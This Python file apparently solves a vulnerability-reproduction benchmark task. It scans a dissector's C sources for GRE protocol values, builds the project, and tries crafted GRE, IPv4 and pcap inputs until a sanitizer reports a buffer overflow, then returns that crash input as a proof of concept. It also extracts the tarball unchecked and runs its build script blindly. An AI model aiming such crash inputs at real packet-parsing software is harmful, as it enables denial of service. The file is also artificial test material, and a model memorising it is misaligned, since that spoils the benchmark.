import os
import tarfile
import tempfile
import subprocess
import re
import struct
import stat


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Main entry: orchestrate extraction, analysis, optional dynamic search, and fallback PoC.
        root_dir, temp_root = self._extract_tarball(src_path)
        try:
            sources_dict, all_text = self._collect_sources(root_dir)
            proto_80211, all_proto_values = self._find_gre_proto_candidates(sources_dict, all_text)
            dlt_map = self._find_dlt_mapping(all_text)

            # Prepare a reasonable static fallback PoC in case dynamic search fails.
            base_proto = proto_80211 if proto_80211 is not None else (all_proto_values[0] if all_proto_values else 0)
            fallback_poc = self._build_gre_packet(base_proto, 8)

            binary_path = self._build_and_find_binary(root_dir)
            if not binary_path:
                return fallback_poc

            poc = self._dynamic_search(binary_path, proto_80211, all_proto_values, dlt_map, temp_root)
            if poc is not None:
                return poc

            return fallback_poc
        except Exception:
            # On any unexpected error, return a simple static PoC.
            return self._build_gre_packet(0, 8)

    # --------- Extraction and source collection ----------

    def _extract_tarball(self, src_path: str):
        base_tmp = tempfile.mkdtemp(prefix="arvo7024_")
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(base_tmp)
        entries = [
            os.path.join(base_tmp, e)
            for e in os.listdir(base_tmp)
            if not e.startswith(".")
        ]
        root_dir = base_tmp
        if len(entries) == 1 and os.path.isdir(entries[0]):
            root_dir = entries[0]
        return root_dir, base_tmp

    def _collect_sources(self, root_dir):
        exts = {".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh"}
        sources = {}
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                _, ext = os.path.splitext(name)
                if ext.lower() in exts:
                    path = os.path.join(dirpath, name)
                    try:
                        with open(path, "r", errors="ignore") as f:
                            sources[path] = f.read()
                    except Exception:
                        continue
        all_text = "\n".join(sources.values())
        return sources, all_text

    # --------- Static analysis: GRE proto table ----------

    def _clean_expr(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
        s = re.sub(r"//.*", "", s)
        return s.strip()

    def _eval_int_expr(self, expr: str, all_text: str):
        expr = expr.strip()
        if not expr:
            return None
        m = re.search(r"0x[0-9a-fA-F]+", expr)
        if m:
            try:
                return int(m.group(0), 16)
            except ValueError:
                return None
        m = re.search(r"\d+", expr)
        if m:
            try:
                return int(m.group(0))
            except ValueError:
                return None
        m = re.match(r"[A-Za-z_]\w*", expr)
        if not m:
            return None
        name = m.group(0)
        name_re = re.escape(name)

        # #define NAME value
        pat_def = re.compile(r"#\s*define\s+" + name_re + r"\s+([0-9xXa-fA-F]+)")
        m2 = pat_def.search(all_text)
        if m2:
            try:
                return int(m2.group(1), 0)
            except ValueError:
                pass

        # const <type> NAME = value;
        pat_const = re.compile(
            r"\b(?:const\s+)?(?:unsigned\s+)?"
            r"(?:int|guint16|uint16_t|guint32|uint32_t)\s+"
            + name_re
            + r"\s*=\s*([0-9xXa-fA-F]+)"
        )
        m3 = pat_const.search(all_text)
        if m3:
            try:
                return int(m3.group(1), 0)
            except ValueError:
                pass

        return None

    def _find_gre_proto_candidates(self, sources_dict, all_text):
        pattern = re.compile(
            r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^,]+),\s*([^)]+)\);',
            re.MULTILINE | re.DOTALL,
        )
        candidates = []
        for text in sources_dict.values():
            for m in pattern.finditer(text):
                arg2 = self._clean_expr(m.group(1))
                arg3 = self._clean_expr(m.group(2))
                val = self._eval_int_expr(arg2, all_text)
                if val is None:
                    continue
                low3 = arg3.lower()
                is_80211 = (
                    "802.11" in low3
                    or "80211" in low3
                    or "wlan" in low3
                    or "wifi" in low3
                )
                candidates.append((val, is_80211))

        if not candidates:
            return None, []

        # Deduplicate and merge flags.
        unique = []
        seen = {}
        for val, is_80211 in candidates:
            if val in seen:
                seen[val] = seen[val] or is_80211
            else:
                seen[val] = is_80211
        for v, fl in seen.items():
            unique.append((v, fl))

        proto_80211 = None
        for v, fl in unique:
            if fl:
                proto_80211 = v
                break
        all_vals = [v for v, _ in unique]
        return proto_80211, all_vals

    # --------- Static analysis: DLT <-> WTAP_ENCAP mapping ----------

    def _find_dlt_mapping(self, all_text: str):
        # Look for entries like: { 101, WTAP_ENCAP_RAW_IP }
        pattern = re.compile(
            r"\{\s*(\d+)\s*,\s*WTAP_ENCAP_([A-Z0-9_]+)\s*\}", re.MULTILINE
        )
        dlt_map = {}
        for m in pattern.finditer(all_text):
            try:
                dlt = int(m.group(1))
            except ValueError:
                continue
            encap = m.group(2)
            dlt_map[dlt] = encap
        return dlt_map

    def _encap_priority(self, name: str) -> int:
        u = name.upper()
        if "GRE" in u:
            return 0
        if "RAW_IP" in u or u.endswith("_IP") or "IPV4" in u or "IP" in u:
            return 1
        if "ETHERNET" in u or "ETH" in u:
            return 2
        return 3

    # --------- Building packets ----------

    def _build_gre_packet(self, proto: int, payload_len: int) -> bytes:
        if proto is None:
            proto = 0
        payload = b"\x00" * max(payload_len, 0)
        return struct.pack("!HH", 0, proto & 0xFFFF) + payload

    def _ip_checksum(self, header: bytes) -> int:
        if len(header) % 2 == 1:
            header += b"\x00"
        s = 0
        for i in range(0, len(header), 2):
            w = (header[i] << 8) + header[i + 1]
            s += w
            s = (s & 0xFFFF) + (s >> 16)
        return (~s) & 0xFFFF

    def _build_ipv4_with_gre(self, proto: int, inner_payload_len: int) -> bytes:
        gre = self._build_gre_packet(proto, inner_payload_len)
        total_len = 20 + len(gre)
        ver_ihl = 0x45
        tos = 0
        ident = 0
        flags_frag = 0
        ttl = 64
        protocol = 47  # GRE
        checksum = 0
        src = struct.pack("!4B", 1, 1, 1, 1)
        dst = struct.pack("!4B", 2, 2, 2, 2)
        header_wo_csum = struct.pack(
            "!BBHHHBBH4s4s",
            ver_ihl,
            tos,
            total_len,
            ident,
            flags_frag,
            ttl,
            protocol,
            checksum,
            src,
            dst,
        )
        csum = self._ip_checksum(header_wo_csum)
        header = struct.pack(
            "!BBHHHBBH4s4s",
            ver_ihl,
            tos,
            total_len,
            ident,
            flags_frag,
            ttl,
            protocol,
            csum,
            src,
            dst,
        )
        return header + gre

    def _build_ethernet_frame(self, payload: bytes, eth_type: int) -> bytes:
        dst = b"\xff" * 6
        src = b"\x00\x11\x22\x33\x44\x55"
        return dst + src + struct.pack("!H", eth_type & 0xFFFF) + payload

    def _build_pcap(self, network: int, packet_bytes: bytes) -> bytes:
        magic = 0xA1B2C3D4
        version_major = 2
        version_minor = 4
        thiszone = 0
        sigfigs = 0
        snaplen = 65535
        global_hdr = struct.pack(
            "<IHHIIII",
            magic,
            version_major,
            version_minor,
            thiszone,
            sigfigs,
            snaplen,
            int(network) & 0xFFFFFFFF,
        )
        incl_len = len(packet_bytes)
        orig_len = len(packet_bytes)
        pkt_hdr = struct.pack("<IIII", 0, 0, incl_len, orig_len)
        return global_hdr + pkt_hdr + packet_bytes

    # --------- Build and locate binary ----------

    def _build_and_find_binary(self, root_dir: str):
        build_sh = os.path.join(root_dir, "build.sh")
        if os.path.exists(build_sh):
            try:
                subprocess.run(
                    ["bash", build_sh],
                    cwd=root_dir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=300,
                    check=False,
                )
            except Exception:
                pass

        candidates = []
        for dirpath, _, filenames in os.walk(root_dir):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                if not (st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)):
                    continue
                try:
                    with open(path, "rb") as f:
                        head = f.read(2)
                    if head.startswith(b"#!"):
                        continue
                except Exception:
                    continue
                candidates.append(path)

        if not candidates:
            return None

        def score(p):
            name = os.path.basename(p).lower()
            sc = 0
            if "fuzz" in name:
                sc += 4
            if "poc" in name or "crash" in name:
                sc += 3
            if "test" in name or "driver" in name or "target" in name:
                sc += 2
            if name == "bin":
                sc += 1
            depth_penalty = -p.count(os.sep)
            return (sc, depth_penalty)

        candidates.sort(key=score, reverse=True)
        return candidates[0]

    # --------- Dynamic search for crashing PoC ----------

    def _run_one(self, binary: str, data: bytes, mode: str, temp_input_path: str) -> bool:
        try:
            if mode == "stdin":
                proc = subprocess.run(
                    [binary],
                    input=data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=1.0,
                    check=False,
                )
            else:
                with open(temp_input_path, "wb") as f:
                    f.write(data)
                proc = subprocess.run(
                    [binary, temp_input_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=1.0,
                    check=False,
                )
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False

        out = proc.stdout + proc.stderr
        if proc.returncode != 0 and (
            b"AddressSanitizer" in out
            or b"Sanitizer" in out
            or b"stack-buffer-overflow" in out
            or b"heap-buffer-overflow" in out
            or b"buffer-overflow" in out
            or b"runtime error" in out
        ):
            return True
        return False

    def _triggers_crash(self, binary: str, data: bytes, temp_input_path: str) -> bool:
        # Try via file first (libFuzzer-style driver usually uses a file argument).
        if self._run_one(binary, data, "file", temp_input_path):
            return True
        if self._run_one(binary, data, "stdin", temp_input_path):
            return True
        return False

    def _dynamic_search(
        self,
        binary: str,
        proto_80211,
        all_proto_values,
        dlt_map,
        temp_dir: str,
    ):
        if not binary:
            return None

        proto_list = []
        if proto_80211 is not None:
            proto_list.append(proto_80211)
        for v in all_proto_values:
            if v not in proto_list:
                proto_list.append(v)
        if not proto_list:
            # No known protos; nothing better to do.
            return None

        # Limit the number of proto values to try.
        proto_list = proto_list[:10]
        temp_input_path = os.path.join(temp_dir, "poc_input.bin")

        for proto in proto_list:
            candidates = []

            # Raw GRE candidates.
            gre_min = self._build_gre_packet(proto, 0)
            candidates.append(gre_min)
            candidates.append(gre_min + b"\x00" * 8)

            # PCAP-based candidates using DLT mapping, if available.
            if dlt_map:
                items = sorted(
                    dlt_map.items(), key=lambda kv: self._encap_priority(kv[1])
                )[:8]
                for dlt, encap in items:
                    encap_u = encap.upper()
                    if "GRE" in encap_u:
                        gre_payload = self._build_gre_packet(proto, 0)
                        candidates.append(self._build_pcap(dlt, gre_payload))
                        ip_gre = self._build_ipv4_with_gre(proto, 0)
                        candidates.append(self._build_pcap(dlt, ip_gre))
                    elif (
                        "RAW_IP" in encap_u
                        or encap_u.endswith("_IP")
                        or "IPV4" in encap_u
                        or "IP" in encap_u
                    ):
                        ip_gre = self._build_ipv4_with_gre(proto, 0)
                        candidates.append(self._build_pcap(dlt, ip_gre))
                    elif "ETHERNET" in encap_u or "ETH" in encap_u:
                        ip_gre = self._build_ipv4_with_gre(proto, 0)
                        eth = self._build_ethernet_frame(ip_gre, 0x0800)
                        candidates.append(self._build_pcap(dlt, eth))

            # Deduplicate candidates.
            unique = []
            seen = set()
            for c in candidates:
                if c not in seen:
                    seen.add(c)
                    unique.append(c)

            for data in unique:
                if self._triggers_crash(binary, data, temp_input_path):
                    return data

        return None